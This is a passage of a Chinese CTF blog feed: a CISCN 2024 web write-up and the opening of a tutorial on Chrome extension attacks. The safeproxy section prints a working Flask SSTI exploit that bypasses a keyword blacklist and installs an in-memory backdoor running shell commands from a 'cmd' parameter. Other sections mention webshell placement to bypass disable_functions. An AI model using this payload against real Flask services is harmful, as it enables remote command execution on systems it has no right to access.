keyword">else</span>             <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;div style='text-align: center;'>"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/div>"</span><span class="token punctuation">;</span>                <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°è¯•æ‹¿èšå‰‘æ’ä»¶æ‰“disable_functionèƒ½å†™ï¼Œä½†æ˜¯è¿ .antproxy.php ä¸Šä¸å»ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><br><p>ç»“æŸåè¯•äº†ä¸€ä¸‹ç›´æ¥åœ¨ &#x2F;tmp å†™é©¬ index.phpï¼Œç„¶å fpm èµ· phpserver å¼€åœ¨ &#x2F;tmp ä¸‹ï¼Œå¯†ç å¡« &#x2F;tmp&#x2F;index.php çš„å³å¯ç»•è¿‡ disable_function ä¸”æ­£å¸¸è¿æ¥</p><p>æ¥ä¸‹æ¥æ‰¾flagï¼Œæœ¬æ¥ä»¥ä¸ºè¦ææƒçš„ï¼Œæ‰¾äº†åŠå¤©æ²¡ææƒç‚¹</p><p><code>find / -type f -name &quot;flag&quot; 2&gt;/dev/null</code>æ‰¾åˆ°äº†ç¥äººflagè·¯å¾„</p><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215204605743.png" alt="image-20241215204605743"></p><hr><h1 id="safeproxy"><a href="#safeproxy" class="headerlink" title="safeproxy"></a>safeproxy</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_string<span class="token keyword">import</span> socket<span class="token keyword">import</span> threading<span class="token keyword">import</span> htmlapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'&lt;pre>'</span><span class="token operator">+</span>html<span class="token punctuation">.</span>escape<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'&lt;/pre>'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">template</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    template_code <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span>    <span class="token comment"># å®‰å…¨è¿‡æ»¤</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> black <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> black <span class="token keyword">in</span> template_code<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Forbidden content detected!"</span>    result <span class="token operator">=</span> render_template_string<span class="token punctuation">(</span>template_code<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'ok'</span> <span class="token keyword">if</span> result <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> <span class="token string">'error'</span><span class="token keyword">class</span> <span class="token class-name">HTTPProxyHandler</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>target_host <span class="token operator">=</span> target_host        self<span class="token punctuation">.</span>target_port <span class="token operator">=</span> target_port    <span class="token keyword">def</span> <span class="token function">handle_request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> client_socket<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            request_data <span class="token operator">=</span> <span class="token string">b""</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                chunk <span class="token operator">=</span> client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>                request_data <span class="token operator">+=</span> chunk                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4096</span><span class="token punctuation">:</span>                    <span class="token keyword">break</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> request_data<span class="token punctuation">:</span>                client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> proxy_socket<span class="token punctuation">:</span>                proxy_socket<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>target_host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>target_port<span class="token punctuation">)</span><span class="token punctuation">)</span>                proxy_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>request_data<span class="token punctuation">)</span>                response_data <span class="token operator">=</span> <span class="token string">b""</span>                <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                    chunk <span class="token operator">=</span> proxy_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> <span class="token keyword">not</span> chunk<span class="token punctuation">:</span>                        <span class="token keyword">break</span>                    response_data <span class="token operator">+=</span> chunk            header_end <span class="token operator">=</span> response_data<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">b"\r\n\r\n"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> header_end <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                body <span class="token operator">=</span> response_data<span class="token punctuation">[</span>header_end <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                body <span class="token operator">=</span> response_data                            response_body <span class="token operator">=</span> body            response <span class="token operator">=</span> <span class="token string">b"HTTP/1.1 200 OK\r\n"</span> \                       <span class="token string">b"Content-Length: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>response_body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\r\n"</span> \                       <span class="token string">b"Content-Type: text/html; charset=utf-8\r\n"</span> \                       <span class="token string">b"\r\n"</span> <span class="token operator">+</span> response_body            client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>response<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Proxy Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">finally</span><span class="token punctuation">:</span>            client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">start_proxy_server</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">:</span>    proxy_handler <span class="token operator">=</span> HTTPProxyHandler<span class="token punctuation">(</span>target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span>    server_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Proxy server is running on </span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>port<span class="token punctuation">&#125;</span></span><span class="token string"> and forwarding to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_host<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_port<span class="token punctuation">&#125;</span></span><span class="token string">..."</span></span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            client_socket<span class="token punctuation">,</span> addr <span class="token operator">=</span> server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Connection from </span><span class="token interpolation"><span class="token punctuation">&#123;</span>addr<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>proxy_handler<span class="token punctuation">.</span>handle_request<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>client_socket<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            thread<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>            thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Shutting down proxy server..."</span><span class="token punctuation">)</span>    <span class="token keyword">finally</span><span class="token punctuation">:</span>        server_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">run_flask_app</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    proxy_host <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>    proxy_port <span class="token operator">=</span> <span class="token number">5001</span>    target_host <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>    target_port <span class="token operator">=</span> <span class="token number">5000</span>    <span class="token comment"># å®‰å…¨åä»£ï¼Œé˜²æ­¢é’ˆå¯¹å“åº”å¤´çš„æ”»å‡»</span>    proxy_thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>start_proxy_server<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>proxy_host<span class="token punctuation">,</span> proxy_port<span class="token punctuation">,</span> target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">)</span>    proxy_thread<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>    proxy_thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Starting Flask app..."</span><span class="token punctuation">)</span>    run_flask_app<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€çœ¼æ‰“sstiï¼Œban äº†å“åº”å¤´</p><p>æ‰“å†…å­˜é©¬åœ¨å“åº”ä½“é‡Œå°±è¡Œ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> fenjing<span class="token keyword">import</span> logging<span class="token keyword">import</span> requestslogging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""[    app.view_functions    for app in [ __import__('sys').modules["__main__"].app ]    for request in [ __import__('sys').modules["__main__"].request ]    if [        app.__dict__.update(&#123;'_got_first_request':False&#125;),        app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)    ]]"""</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">'\\'</span> <span class="token punctuation">,</span> <span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span>    <span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token builtin">all</span><span class="token punctuation">(</span>word <span class="token keyword">not</span> <span class="token keyword">in</span> s <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">)</span>full_payload_gen <span class="token operator">=</span> fenjing<span class="token punctuation">.</span>FullPayloadGen<span class="token punctuation">(</span>waf<span class="token punctuation">)</span>payload<span class="token punctuation">,</span> will_print <span class="token operator">=</span> full_payload_gen<span class="token punctuation">.</span>generate<span class="token punctuation">(</span>    fenjing<span class="token punctuation">.</span>const<span class="token punctuation">.</span>EVAL<span class="token punctuation">,</span> <span class="token punctuation">(</span>fenjing<span class="token punctuation">.</span>const<span class="token punctuation">.</span>STRING<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token keyword">not</span> will_print<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"è¿™ä¸ªpayloadä¸ä¼šäº§ç”Ÿå›æ˜¾"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>    <span class="token string">"http://47.93.212.188:32936"</span><span class="token punctuation">,</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215100840684.png" alt="image-20241215100840684"></p><hr><h1 id="sxweb1ï¼ˆUnsolvedï¼‰"><a href="#sxweb1ï¼ˆUnsolvedï¼‰" class="headerlink" title="sxweb1ï¼ˆUnsolvedï¼‰"></a>sxweb1ï¼ˆUnsolvedï¼‰</h1><p>Apache&#x2F;2.4.58</p><p>ç›´æ¥è®¿é—® publishers.phpï¼Œè¿”å›<code>more lines returned. maybe SQL injection Attack</code></p><hr><h1 id="easywebï¼ˆUnsolvedï¼‰"><a href="#easywebï¼ˆUnsolvedï¼‰" class="headerlink" title="easywebï¼ˆUnsolvedï¼‰"></a>easywebï¼ˆUnsolvedï¼‰</h1><p>è¿›å»403ï¼Œå¼€æ‰«</p><p>æœ‰ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„æ¥å£å’Œä¸€ä¸ªä¸‹è½½æ–‡ä»¶çš„æ¥å£</p><p>ä¸‹è½½æ–‡ä»¶é™åˆ¶åç¼€ä¸º .txt å’Œ .zip</p><p>ä¸Šä¼ æ–‡ä»¶é™åˆ¶åç¼€ä¸ºå›¾ç‰‡ä¸”æ— å›æ˜¾è·¯å¾„</p><hr><h1 id="sxweb2ï¼ˆUnsolvedï¼‰"><a href="#sxweb2ï¼ˆUnsolvedï¼‰" class="headerlink" title="sxweb2ï¼ˆUnsolvedï¼‰"></a>sxweb2ï¼ˆUnsolvedï¼‰</h1><p>çœ‹èµ·æ¥åƒæ˜¯ 1 çš„è¿›é˜¶ç‰ˆï¼Œå®é™…ä¸Š 1 è¿˜æ˜¯0è§£</p><p>è¿›å»å‘ç°è·¯å¾„ç›´æ¥åœ¨ &#x2F;cgi-bin&#x2F;index.py äº†</p><p>å•ç‹¬è®¿é—® &#x2F;cgi-bin&#x2F; å¾—åˆ°</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">/    html/        index.html        apache.jpg    db/        pubs.db    cgi-bin/        local/            flag.py        index.cgi        authors.py        index.py        wget.py        update_authorsform.py        updateauthor.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯ç›´æ¥è®¿é—® &#x2F;cgi-bin&#x2F;local&#x2F;flag.py ä¼šè¿”å›403</p><p>å°è¯•é€šè¿‡ wget.py è®¿é—® 127.0.0.1&#x2F;cgi-bin&#x2F;local&#x2F;flag.py ï¼Œè¿”å› Notice: local access is not allowed</p><p>&#x2F;bin&#x2F;authors.py</p><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215210603673.png" alt="image-20241215210603673"></p><p>&#x2F;cgi-bin&#x2F;update_authorsform.py</p><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215210619778.png" alt="image-20241215210619778"></p><p>&#x2F;cgi-bin&#x2F;updateauthor.py</p><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215210707260.png" alt="image-20241215210707260"></p><hr><h1 id="BookManagerï¼ˆUnsolvedï¼‰"><a href="#BookManagerï¼ˆUnsolvedï¼‰" class="headerlink" title="BookManagerï¼ˆUnsolvedï¼‰"></a>BookManagerï¼ˆUnsolvedï¼‰</h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ä¸€è§‰é†’æ¥NISAå®åŠ›ä¸‹é™ä¸€ä¸‡å€ï¼Œå“ˆå“ˆä¸¤äººé€€å½¹ä¹‹åæˆ‘ä»¬å®Œè›‹äº†&lt;/p&gt;
&lt;p&gt;è¿™b webçœŸæ˜¯ä¸€å¤©æ¯”ä¸€å¤©éš¾æ‰“äº†ï¼Œæ¢­å“ˆåŠå¤©æ‹¿ä¸ä¸‹å°‘è§£é¢˜ï¼Œå…¶ä»–é¢˜å›å¤´å°±è¢«æ‰“çƒ‚&lt;/p&gt;
&lt;p&gt;å­¦webæ•‘ä¸äº†NISAï¼Œå”‰æˆ‘å¥½èœå•ŠğŸ˜­&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/16750&quot;&gt;https://xz.aliyun.com/t/16750&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/16792&quot;&gt;https://xz.aliyun.com/t/16792&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>Chromeæ‰©å±•æ”»å‡»</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/15/Chrome%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/15/Chrome%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</id>
    <published>2024-12-14T16:51:25.000Z</published>
    <updated>2024-12-25T02:37:28.232Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¹‹å‰æ‰“ GeekGame çš„æ—¶å€™å°±é‡åˆ°è¿‡åˆ©ç”¨ chrome æ‰©å±•è¿›è¡Œ xss çš„é¢˜ï¼Œæ­£å¥½çœ‹åˆ°æœ‰ç›¸å…³çš„æ–‡ç« ï¼Œé‚å­¦ä¹ ä¸€ä¸‹</p><p>å‚è€ƒï¼š</p><p><a href="https://blog.xlab.app/p/4db211d1/">https://blog.xlab.app/p/4db211d1/</a></p><p><a href="https://blog.xlab.app/p/4db211d2/">https://blog.xlab.app/p/4db211d2/</a></p><span id="more"></span><hr><h1 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h1><h2 id="ç»„ä»¶ä»‹ç»"><a href="#ç»„ä»¶ä»‹ç»" class="headerlink" title="ç»„ä»¶ä»‹ç»"></a>ç»„ä»¶ä»‹ç»</h2><p>edge çš„æ‰©å±•ä½ç½®åœ¨ <code>%localappdata%\Microsoft\Edge\User Data\Default\Extensions</code></p><p>æ¥ä¸‹æ¥ä»¥ GeekGame2024 é‡Œ web-crx æ›´æ–°åçš„æ‰©å±•æ–‡ä»¶ bxx ä¸ºä¾‹å­æ¥ç†Ÿæ‚‰ç»„ä»¶</p><h2 id="manifest-json"><a href="#manifest-json" class="headerlink" title="manifest.json"></a>manifest.json</h2><p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://developer.chrome.google.cn/docs/extensions/reference/manifest?hl=zh-cn">https://developer.chrome.google.cn/docs/extensions/reference/manifest?hl=zh-cn</a></p><p>æ‰©å±•ç¨‹åºçš„é…ç½®æ¸…å•ï¼Œæ”¾åœ¨æ‰©å±•ç¨‹åºä»£ç çš„æ ¹ç›®å½•ï¼ŒåŒ…å«ä»¥ä¸‹å†…å®¹ï¼š</p><ol><li><p>åç§°ï¼Œæè¿°ï¼Œç‰ˆæœ¬ç­‰</p><p>æœ€å°æ¸…å•ï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"manifest_version"</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Minimal Manifest"</span><span class="token punctuation">,</span>  <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>  <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"A basic example extension with only required keys"</span><span class="token punctuation">,</span>  <span class="token property">"icons"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"48"</span><span class="token operator">:</span> <span class="token string">"images/icon-48.png"</span><span class="token punctuation">,</span>    <span class="token property">"128"</span><span class="token operator">:</span> <span class="token string">"images/icon-128.png"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>APIæƒé™å®šä¹‰ï¼Œå¦‚ è¯»å†™ä¹¦ç­¾&#x2F;å†å²&#x2F;Cookie ç­‰ Chrome API</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"permissions"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"tabs"</span><span class="token punctuation">,</span> <span class="token string">"scripting"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>ç½‘ç«™æƒé™å®šä¹‰ï¼Œå…è®¸æ— è§†åŒæºç­–ç•¥è®¿é—®å“ªäº›ç½‘ç«™</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"host_permissions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"&lt;all_urls>"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>å®šä¹‰<code>Content scripts</code>æ˜¯å“ªäº› jsï¼Œåœ¨å“ªé‡Œä½•æ—¶è¿è¡Œç­‰</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"content_scripts"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"matches"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"*://*/*"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"js"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"contentScript.bundle.js"</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>å®šä¹‰<code>Background scripts</code>æ˜¯å“ªäº› js</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"background"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"service_worker"</span><span class="token operator">:</span> <span class="token string">"background.bundle.js"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><code>CSP</code>ç­–ç•¥â€¦</p></li></ol><hr><h2 id="Content-scripts"><a href="#Content-scripts" class="headerlink" title="Content scripts"></a>Content scripts</h2><p><a 